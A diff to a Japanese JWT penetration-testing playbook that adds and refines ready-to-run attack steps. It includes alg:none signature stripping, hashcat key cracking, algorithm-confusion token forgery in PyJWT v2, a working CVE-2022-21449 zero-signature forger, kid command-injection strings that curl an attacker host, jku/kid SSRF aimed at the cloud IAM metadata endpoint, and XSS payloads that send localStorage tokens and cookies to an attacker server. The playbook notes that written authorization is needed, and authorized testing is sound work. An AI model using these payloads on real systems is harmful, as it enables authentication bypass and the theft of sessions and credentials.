@@ -71,7 +71,8 @@ python3 jwt_tool.py [JWT_TOKEN]
 | `"jwk": {...}` が存在 / 受理される | 公開鍵が JWT 自身に埋め込まれる | §5 jwk インジェクション |
 | ペイロードに `role` / `admin` / `isAdmin` / `scope` / `groups` | 書き換え標的が明確 | §2 〜 §8 のいずれかで偽造後に該当フィールド変更 |
 | ペイロードに `exp` / `iss` / `aud` のみ、`role` 系なし | 権限がサーバ側 DB から引かれている可能性 | §9 Claims 検証不備や `IDOR.md` 経路へ |
-| ヘッダーが `"typ": "JWE"` | JWE（暗号化 JWT）・本ファイルスコープ外 | 別経路（鍵交換攻撃・JWE 固有 bug）を検討 |
+| **セグメント数（`.` の数）が 4（= 5 セグメント）** + ヘッダーに `enc` フィールドあり | JWE（暗号化 JWT・本ファイルスコープ外） | 別経路（鍵交換攻撃・JWE 固有 bug）を検討 |
+| セグメント数が 2（= 3 セグメント）+ `enc` フィールド無し | JWS（署名のみ・本ファイル対象） | 本ファイルの §2 以降を適用 |
 
 **注意:** JWT は Base64**URL** エンコード（`+`→`-`、`/`→`_`、パディング `=` なし）。`base64 -d` が失敗するときは下記の Python ワンライナーで補正する:
 
@@ -122,7 +123,7 @@ python3 jwt_tool.py [JWT_TOKEN] -T
 
 ## 3. alg:none 攻撃（Accepting Tokens With No Signature）
 
-**前提:** サーバが `alg: none`（署名なし）を受け入れる実装ミスがある場合に成立。JWT 仕様 (RFC 7519) では `none` は許容されているが、本番では拒否すべきもの。
+**前提:** サーバが `alg: none`（署名なし）を受け入れる実装ミスがある場合に成立。`alg: none` を定義しているのは **RFC 7518 (JWA)** の §3.6（JWT 本体の RFC 7519 ではない）で、仕様上は受信可能だが本番では拒否すべきもの。
 
 **コマンド:**
 
@@ -152,6 +153,7 @@ print(token)
 |---|---|---|
 | 200 OK + 昇格したロールでアクセス成立 | `alg:none` 受理 | 権限関連フィールド書き換えて目的達成 |
 | 401 with "Algorithm not allowed" | `none` が明示的に拒否 | 大文字小文字バリエーション（`None` / `NONE` / `nOnE`）を試す |
+| `none` を弾かれるが署名部の有無で挙動が変わる | **署名ストリッピング** — ライブラリの実装差で `header.payload.`（末尾ピリオドあり・空署名）と `header.payload`（末尾ピリオドなし）でパース結果が変わる場合がある | **両方の形を試す**: `echo -n '{"alg":"none","typ":"JWT"}\|{...payload...}' \| jq ...` で末尾ピリオドあり / なし両方を生成して送る |
 | 401 with "Invalid signature" | 署名検証は行われている | §4 HMAC ブルートフォース or §5 以降の鍵管理系へ |
 | 大文字小文字バリエーションで挙動が変わる | 独自実装で case-sensitive な比較 | 効くバリエーションを採用 |
 
@@ -168,17 +170,16 @@ print(token)
 **コマンド:**
 
 ```bash
-# [Attacker] hashcat (mode 16500 = JWT)
+# [Attacker] hashcat (mode 16500 = JWT) — JWT 用の標準手段
 echo -n "[JWT_TOKEN]" > /tmp/jwt.txt
 hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
 hashcat -a 0 -m 16500 /tmp/jwt.txt [WORDLIST_PATH]    # カスタム辞書
 
-# [Attacker] john でも可
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 /tmp/jwt.txt
-
 # [Attacker] jwt_tool 経由（小規模辞書向け）
 python3 jwt_tool.py [JWT_TOKEN] -C -d [WORDLIST_PATH]
 ```
+
+> **john は素の JWT を直接食わない:** john の `--format=HMAC-SHA256` は内部的に `salt$hash` 形式を要求する hash format で、`header.payload.signature` 形式の生 JWT をそのまま渡しても動かない。john を使うなら `jwt2john.py` 等の変換スクリプトで先に `$HMAC-SHA256$header.payload$signature` 形式に変換する必要がある。**実用上は hashcat の `-m 16500` 一本で十分**。
 
 **観測される出力 → 次のアクション:**
 
@@ -264,7 +265,9 @@ python3 -m http.server 8080 --directory [JWKS_DIR]
 | 401 即応答 + 攻撃者側 HTTP サーバにアクセスなし | サーバが `jku` を fetch していない | `x5u` の有無も確認、なければ §5 jwk へ |
 | `[ATTACKER_HTTP_SERVER]` のログに GET /jwks.json が記録 | サーバが取得しに来ている | 何度かリクエストして JWKS キャッシュの有無も観察 |
 
-**注意:** サーバが JWKS をキャッシュする実装の場合、初回リクエストの取得分が一定期間使われる。**攻撃者用 JWKS を先に取得させてから改ざんトークンを送る順序**が重要。キャッシュ期間切れ後の再取得タイミングも考慮する。
+**注意:** サーバが JWKS をキャッシュする実装の場合、初回リクエストの取得分が一定期間使われる。**手順順序: (1) 攻撃者の HTTP サーバで JWKS を公開状態にする → (2) 改ざんトークンをサーバへ送る → (3) サーバが `jku` URL を fetch しに来て、その JWKS で署名検証する**。「先に攻撃者側 JWKS を公開しておく」のが要点で、サーバ側のキャッシュが切れた後の再取得タイミングも見越して JWKS は出しっぱなしにしておく。
+
+**`jku` を SSRF gadget として使う:** `jku` が外部 URL を許可している場合、`jku=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]` のような内部メタデータエンドポイントを指定すると、**サーバが JWKS として解釈失敗するが、JSON 解析エラーログ・応答時間差・到達可否で内部 SSRF 経路の有無を観測できる**（応答が IAM credentials の JSON の場合、エラー内容に IAM 情報が echo されて漏洩することも）。→ `SSRF.md` の IMDS 経路と併用。
 
 ---
 
@@ -286,7 +289,30 @@ python3 jwt_tool.py [JWT_TOKEN] -T
 # その後 -S hs256 -p '[ATTACKER_CONTROLLED_SECRET]' で署名
 ```
 
-### 7.2 kid パストラバーサル（既知ファイルを秘密鍵化）
+### 7.2 kid SSRF / コマンドインジェクション
+
+サーバが `kid` を **URL として fetch する**実装（kid 経由で外部から鍵を取りに行く）や、**OS コマンドの一部として渡す**実装（`openssl ... -in [KID]` 等）が稀に存在する。
+
+```bash
+# [Attacker] kid に URL を入れて SSRF gadget 化
+#   - 内部メタデータ: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+#   - 内部管理画面:    http://127.0.0.1:8080/admin/
+#   - 外部 callback:   http://[ATTACKER_HTTP_SERVER]/probe-kid?token=[TOKEN_ID]
+python3 -c "
+import jwt
+header = {'alg': 'HS256', 'typ': 'JWT', 'kid': 'http://[ATTACKER_HTTP_SERVER]/x'}
+print(jwt.encode({'sub': '[USER]'}, '', algorithm='HS256', headers=header))
+"
+
+# [Attacker] kid に OS コマンドメタ文字を入れて反応観察（コマンドインジェクションが稀に成立）
+#   `key.pem; curl http://[ATTACKER]/`
+#   `$(curl http://[ATTACKER]/cmd-injected)`
+#   `` `id` ``
+```
+
+> **観測:** 攻撃者の HTTP サーバに到達したログが残れば SSRF 成立。エラー応答に kid 値が echo されない / 応答時間が変わらない場合は kid が外部リソース取得に使われていない可能性が高い。
+
+### 7.3 kid パストラバーサル（既知ファイルを秘密鍵化）
 
 サーバが `read(file=kid)` 相当で鍵ファイルを読む実装で成立。`/dev/null` 等の **中身が予測可能なファイル**を指定し、その内容を秘密鍵として HMAC 署名する。
 
@@ -339,7 +365,7 @@ openssl s_client -connect [TARGET_HOST]:443 2>/dev/null | openssl x509 -pubkey -
 ```
 
 ```python
-# [Attacker] 公開鍵を HS256 の secret として再署名
+# [Attacker] 公開鍵を HS256 の secret として再署名（PyJWT v1.x の書き方・v2+ では TypeError になるので下の v2 版を使う）
 import jwt
 
 with open("/tmp/pubkey.pem", "rb") as f:
@@ -349,6 +375,31 @@ token = jwt.encode(
     {"sub": "[USER_ID]", "role": "admin"},
     pubkey,
     algorithm="HS256"
+)
+print(token)
+```
+
+> **⚠️ PyJWT v2.0+ ではこのコードは `TypeError: Expected a string value` で落ちる**（v2 は RSA 鍵を HMAC キーに渡す型を弾く）。**v2 環境では下記の bytes 化版**を使う：
+
+```python
+# [Attacker] PyJWT v2.0+ 対応版 — cryptography で公開鍵を読み込み、PEM bytes に再シリアライズして渡す
+import jwt
+from cryptography.hazmat.primitives import serialization
+
+with open("/tmp/pubkey.pem", "rb") as f:
+    pubkey_obj = serialization.load_pem_public_key(f.read())
+
+# サーバ側が検証で使う「生の PEM bytes」と完全一致させる必要がある
+# （X.509 SubjectPublicKeyInfo 形式が一般的・PKCS#1 RSAPublicKey 形式とは別物）
+pubkey_pem = pubkey_obj.public_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo,
+)
+
+token = jwt.encode(
+    {"sub": "[USER_ID]", "role": "admin"},
+    pubkey_pem,    # bytes として渡す
+    algorithm="HS256",
 )
 print(token)
 ```
@@ -382,16 +433,64 @@ docker run --rm -it portswigger/sig2n [TOKEN_1] [TOKEN_2]
 | サーバの応答 | 示唆 | 次のアクション |
 |---|---|---|
 | 200 OK + 昇格成功 | algorithm confusion 成立 | 権限フィールド書き換えて目的達成 |
-| 401 "Invalid signature" | `alg` ヘッダーがホワイトリスト化されている / 鍵タイプ別に管理 | §5 jwk / §6 jku / §7 kid へ戻る |
-| 401 "Invalid algorithm" | RS256 と HS256 で検証経路が完全分離 | 8.2 sig2n でも刺さらない、別経路へ |
-| 500 / PEM parsing error | PEM 形式の改行 / X.509 ヘッダー違い | 鍵を `cat -A` で確認、改行を `\n` で揃える |
-| sig2n 出力の 2 候補両方で 401 | n 導出失敗 / 想定外の alg 検証 | 別の 2 トークンペアで再試行（`iat` のみ異なるペアが安定） |
+| §8.1 で 401 "Invalid signature" + 公開鍵自体は入手済み | PEM 形式の差異（X.509 SubjectPublicKeyInfo vs PKCS#1 RSAPublicKey）/ 改行差異 | §8.1 内で PEM 形式変換を試す（`openssl rsa -pubin -in pub.pem -RSAPublicKey_out`）+ Burp JWT Editor で再試行 |
+| §8.1 で 401 "Invalid algorithm" | `alg` ホワイトリスト化済（RS256 と HS256 完全分離） | §8.1 はこれ以上刺さらない・§8.2 へ |
+| §8.2 sig2n の 2 候補両方で 401 | n 導出失敗 / 想定外の alg 検証 | 別の 2 トークンペア（`iat` のみ異なる安定ペア）で再試行 → ダメなら §10 ES256 系か別経路（`IDOR.md` / `OAuth_Attacks.md`） |
+| §8.2 で 500 / PEM parsing error | 鍵 PEM の改行 / X.509 ヘッダー違い | 鍵を `cat -A` で確認、改行を `\n` で揃える + Burp 拡張経由で再試行 |
 
 **注意:** PyJWT v2.x は `algorithm='HS256'` に PEM 公開鍵を直接渡すと TypeError を出す（型チェックで弾く）。`cryptography` ライブラリの `load_pem_public_key` で読み込み後、`.public_bytes()` で bytes にして渡す。または PyJWT v1.x にダウングレード。**Burp JWT Editor 拡張は内部で同等の処理を自動化**しているため、手動コードで詰まったら拡張を使う方が早い。PEM の表現差（X.509 SubjectPublicKeyInfo vs PKCS#1 RSAPublicKey）でも HMAC 結果が変わるため、サーバ側が使う形式と完全一致させる必要がある。
 
 ---
 
-## 9. Claims 検証の不備（exp / iss / aud / nbf）
+## 9. Psychic Signatures — ES256 / ES384 で r=s=0 の不正署名（CVE-2022-21449）
+
+**前提:** `alg` が ES256 / ES384 / ES512（ECDSA）で、サーバが **Java 15 / 16 / 17（パッチ未適用）の `Signature.verify()`** を使っている場合に成立。**ECDSA 署名 `(r, s)` の `r=0` かつ `s=0` を受け入れる致命的な実装バグ**で、任意ペイロードに `r=0, s=0` を付けるだけで検証が通る。
+
+**コマンド:**
+
+```bash
+# [Attacker] 任意 payload + ヘッダー alg を保持 + 署名部を r=s=0 (DER エンコード) に置換
+
+# 1. payload を Base64URL で構築
+HEADER='{"alg":"ES256","typ":"JWT"}'
+PAYLOAD='{"sub":"[USER_ID]","role":"admin","iat":'$(date +%s)'}'
+HEADER_B64=$(echo -n "$HEADER" | base64 -w0 | tr -d '=' | tr '/+' '_-')
+PAYLOAD_B64=$(echo -n "$PAYLOAD" | base64 -w0 | tr -d '=' | tr '/+' '_-')
+
+# 2. 署名部 = ECDSA DER で r=0, s=0 を表現したバイト列を Base64URL
+# DER エンコード: 30 06 02 01 00 02 01 00 （SEQUENCE { INTEGER 0, INTEGER 0 }）
+SIG_B64=$(printf '\x30\x06\x02\x01\x00\x02\x01\x00' | base64 -w0 | tr -d '=' | tr '/+' '_-')
+
+# 3. 連結して送信
+echo "${HEADER_B64}.${PAYLOAD_B64}.${SIG_B64}"
+```
+
+```python
+# [Attacker] Python 版
+import base64, json
+def b64u(b):
+    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+
+header = b64u(json.dumps({"alg": "ES256", "typ": "JWT"}, separators=(',', ':')).encode())
+payload = b64u(json.dumps({"sub": "[USER_ID]", "role": "admin"}, separators=(',', ':')).encode())
+# DER(SEQUENCE { INTEGER 0, INTEGER 0 }) = 30 06 02 01 00 02 01 00
+sig = b64u(bytes.fromhex('3006020100020100'))
+print(f"{header}.{payload}.{sig}")
+```
+
+**観測される出力 → 次のアクション:**
+
+| サーバの応答 | 示唆 | 次のアクション |
+|---|---|---|
+| 200 OK + 昇格成功 | **CVE-2022-21449 該当**（Java 15-17 パッチ未適用）| **finding 化必須**（深刻度 Critical）。任意 ECDSA トークン偽造可能 |
+| 401 "Invalid signature" | パッチ済 / Java 以外のランタイム / `BouncyCastle` 経由検証 | §10 はこれ以上刺さらない・別経路へ |
+| 500 / "ASN.1 parsing error" | ECDSA 署名形式の解釈エラー | DER エンコードを `\x30\x06...` で送り直す（IEEE P1363 形式の `r||s` ではない点に注意）|
+
+**注意:** **Java 15.0.7 / 16.0.3 / 17.0.3 以降では修正済み**。BouncyCastle / OpenSSL バックエンドは元から非該当。**ES256 / ES384 / ES512 を見たら必ず本攻撃を 1 回試す**（コストが極めて低い）。判定経由のサイドチャネルとしても有用。
+
+---
+
+## 10. Claims 検証の不備（exp / iss / aud / nbf）
 
 **前提:** §2 〜 §8 の署名関連攻撃が全て失敗した場合に、**署名は適切に検証されているがクレーム検証が抜けている**実装ミスを狙う。単独では権限昇格には直結しないが、トークンの長期流用や別テナント token 流用の起点になる。
 
@@ -406,11 +505,16 @@ print(payload['exp'])   # 過去時刻のはず
 ```
 
 ```bash
-# [Attacker] jwt_tool でクレーム検証バイパスを一括チェック
+# [Attacker] jwt_tool でクレーム検証バイパスを一括チェック（Authorization ヘッダー版）
 python3 jwt_tool.py [JWT_TOKEN] -M at \
   -t https://[TARGET_HOST]/[PROTECTED_ENDPOINT] \
   -rh "Authorization: Bearer [JWT_TOKEN]"
 # -M at : all tests モード（exp / nbf / iss / aud / kid / 各種 alg 攻撃を順次実行）
+
+# [Attacker] JWT が Cookie に格納されている環境では -rc (Request Cookie) で渡す
+python3 jwt_tool.py [JWT_TOKEN] -M at \
+  -t https://[TARGET_HOST]/[PROTECTED_ENDPOINT] \
+  -rc "session=[JWT_TOKEN]"
 ```
 
 **観測される出力 → 次のアクション:**
@@ -434,13 +538,52 @@ python3 jwt_tool.py [JWT_TOKEN] -M at \
 | §4 HMAC ブルートフォースで全辞書を消費 | ランダム生成された強鍵 | §5 jwk / §6 jku / §7 kid / §8 algorithm confusion へ |
 | §5 jwk で 401 | ヘッダー内の鍵が無視されている | §6 jku（外部 URL 経由）に切替 |
 | §6 jku 差し替えで攻撃者 HTTP サーバへのアクセスログがない | サーバが `jku` を fetch していない | §5 jwk または §7 kid へ |
-| §7 kid SQLi も path traversal も無反応 | kid に対するサニタイズが堅い | §8 algorithm confusion へ |
-| §8 で 401 | `alg` ホワイトリスト化済み | §9 claims 検証 / トークン以外の経路（`IDOR.md` / `SSRF.md` 等） |
+| §7.1/7.2/7.3 kid SQLi / SSRF / path traversal も無反応 | kid に対するサニタイズが堅い | §8 algorithm confusion へ |
+| §8 で 401 | `alg` ホワイトリスト化済み | `alg` が ES* なら §9 Psychic Signatures、それ以外なら §10 claims 検証 / トークン以外の経路（`IDOR.md` / `SSRF.md` 等） |
+| §9 でも 401 | パッチ済 Java / 別ランタイム | §10 claims 検証 |
+| §10 でも昇格しない | クレーム検証も堅い | **JWT が Cookie / localStorage に格納されているなら XSS 経由窃取の経路に切替**（後述の「Cookie / localStorage 経由の窃取」節）|
 | 全パターン失敗 | 適切に実装されたライブラリ + 適切な設定 | JWT 以外の認証経路（パスワードリセット / OAuth → `OAuth_Attacks.md` / SAML / SSO 連携）に攻撃面を移す |
+
+## Cookie / localStorage 経由の窃取（XSS との連鎖）
+
+JWT は格納場所によって窃取経路が変わる。**`Authorization: Bearer ...` ヘッダー直接** ・**Cookie**・**`localStorage` / `sessionStorage`** の 3 パターンを区別する。
+
+| 格納場所 | JS から読めるか | XSS で窃取できるか | 確認方法 |
+|---|---|---|---|
+| `Authorization` ヘッダー（毎リクエスト送信）| アプリが保持元から読む必要あり | 保持元が `localStorage` / `sessionStorage` 経由なら可 | DevTools Network タブで毎リクエストにヘッダ出現 / Storage タブ確認 |
+| Cookie（`HttpOnly` あり）| **読めない** | **直接窃取不可**（CSRF 連携などで利用は可能）| `document.cookie` で見えるか確認 |
+| Cookie（`HttpOnly` 無し）| 読める | **`document.cookie` 経由で即窃取可** | `document.cookie` で見える + `SameSite=None` なら CSRF 連携も可能 |
+| `localStorage` / `sessionStorage` | 読める | **`localStorage.getItem('token')` で即窃取可** | DevTools Application → Storage |
+
+**XSS 経由窃取の典型ペイロード:**
+
+```javascript
+// localStorage 経由
+fetch('http://[ATTACKER_HTTP_SERVER]/collect?t=' + localStorage.getItem('token'))
+
+// Cookie 経由（HttpOnly 無しの場合のみ）
+fetch('http://[ATTACKER_HTTP_SERVER]/collect?c=' + document.cookie)
+
+// Service Worker や fetch interceptor を仕込んで Authorization ヘッダーを盗む（持続的窃取）
+//   元コードが fetch を使っているなら fetch をモンキーパッチして Authorization を傍受
+```
+
+**Cookie 属性で見るべき項目:**
+
+| 属性 | 推奨 | 攻撃側の見方 |
+|---|---|---|
+| `HttpOnly` | あるべき | 無ければ XSS 即窃取 |
+| `Secure` | あるべき | 無ければ HTTP 通信で平文漏洩 |
+| `SameSite=Strict` / `Lax` | あるべき | `None` なら CSRF / クロスサイト悪用可能 |
+| `Path=/` 過広 | 必要最小 | path 越境で別アプリの XSS から窃取可 |
+
+> **観点まとめ:** §2〜§10 で偽造系が全滅したら、**XSS が別途見つかっていないか**を確認する。XSS 経由で正規ユーザー（管理者含む）のトークンが手に入れば、本ファイルの偽造プロセス全てをスキップして直接認証通過できる。XSS の発見・悪用は `XSS.md` 参照。
+
+---
 
 ## 注意点・落とし穴
 
-> **[HIGH IMPACT]** §2 〜 §8 の偽造トークンを使った権限昇格は以下の理由で本番では事前合意必須:
+> **[HIGH IMPACT]** §2 〜 §9 の偽造トークンを使った権限昇格は以下の理由で本番では事前合意必須:
 > - [x] **認証バイパスに該当**（権限境界の侵害）
 > - [ ] 持続化に該当
 > - [ ] 不可逆な設定変更を含む
@@ -452,7 +595,7 @@ python3 jwt_tool.py [JWT_TOKEN] -M at \
 
 ### 本番での前提
 
-- **事前合意の要否**: ★（§1 デコードのみは技術的判断で実施可）/ ★★★（書面承認必須 — §2 〜 §8 の認証バイパスを伴う偽造）/ ★★（口頭確認可 — §9 claims 検証は finding 報告レベル）
+- **事前合意の要否**: ★（§1 デコードのみは技術的判断で実施可）/ ★★★（書面承認必須 — §2 〜 §9 の認証バイパスを伴う偽造）/ ★★（口頭確認可 — §10 claims 検証は finding 報告レベル）
 - **想定される SIEM / EDR 検知**: WAF ルール（`alg:none` / 異常なヘッダーフィールドのブロック）/ 認証ログの異常ロール付与アラート / `jku` 外部 fetch ログ / kid SQL エラーアラート / 短時間での大量署名検証失敗
 - **業務影響リスク**: なし（§1 偵察は影響なし）。§2 〜 §8 で認証バイパス成功後の操作（管理画面操作・他ユーザーデータ書き換え）の影響は操作内容による
 - **原状回復必須項目**: ✅ 偽造トークンで作成・変更したデータの復元 / ✅ §6 で起動した攻撃者 JWKS HTTP サーバの停止 / ✅ §6 / §8 で生成した攻撃者鍵ペアの破棄
